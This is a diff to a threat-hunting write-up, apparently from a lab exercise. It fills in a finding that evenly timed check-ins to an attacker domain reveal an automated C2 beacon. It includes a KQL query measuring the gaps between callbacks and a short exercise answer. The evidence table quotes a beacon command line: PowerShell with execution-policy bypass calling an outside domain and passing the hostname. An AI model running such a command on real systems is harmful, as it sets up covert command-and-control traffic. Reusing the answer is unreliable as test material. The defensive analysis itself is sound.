@@ -750,6 +750,8 @@ This analysis helps:
 - Identify abnormal PowerShell execution patterns.
 - Focus investigation efforts on suspicious parent processes and user activity.
 - Improve detections by incorporating process ancestry.
+
+
 ### 🔧 KQL Query Used
 ```kql
 DeviceProcessEvents
@@ -778,31 +780,47 @@ gc_worker.exe
 `HUNT LEAD: "Look at the spacing between the early check-ins to the first domain. Don't give me a number. Tell me what that rhythm proves about what's driving the channel."`
 
 ### 📌 Finding
-<High-level description of the activity>
+The initial communications with the attacker-controlled domain showed a consistent and predictable timing pattern between check-ins. The repeated, evenly spaced callbacks indicate that the channel was being driven by an automated beacon process rather than an operator manually issuing commands.The timing pattern suggests a scheduled/scripted callback mechanism where the implant periodically contacted the C2 infrastructure to check for instructions.
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Host | npt-ws01 |
+| Timestamp | 2026-06-16T20:58:02.3673704Z (initial beacon activity) |
+| Process | powershell.exe |
+| Parent Process |  powershell.exe |
+| Command Line | "powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri "https://updates.sync-northpeak.com/api/status?host=NPT-WS01" -UseBasicParsing -TimeoutSec 4 |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+Beacon timing analysis helps distinguish between hands-on-keyboard activity and automated malware communication. A human operator typically creates irregular activity based on their actions, while malware implants often communicate at predictable intervals.
+
+Identifying automated beacon behavior allows defenders to:
+- Detect command-and-control infrastructure.
+- Identify compromised endpoints communicating with external systems.
+- Differentiate automated malware activity from legitimate administrative actions.
+- Build behavioral detections based on communication patterns rather than static indicators.
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
+| where DeviceName has "npt-ws01"
+| where ProcessCommandLine contains "northpeak.com"
+| project TimeGenerated, ProcessCommandLine
+| sort by TimeGenerated asc
+| extend GapSeconds = datetime_diff('second', TimeGenerated, prev(TimeGenerated, 1))
+| project TimeGenerated, GapSeconds, ProcessCommandLine
+```
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="975" height="97" alt="image" src="https://github.com/user-attachments/assets/13ee1657-6888-4dfc-abdb-a0cd63847fcf" />
+
 
 ### 🛠️ Detection Recommendation
 
-**Hunting Tip:**  
-<Actionable guidance for defenders>
+**Answer:**  
+Automated beacon, regular timing indicates a scheduled/scripted callback mechanism rather than manual operator activity
 
 </details>
 
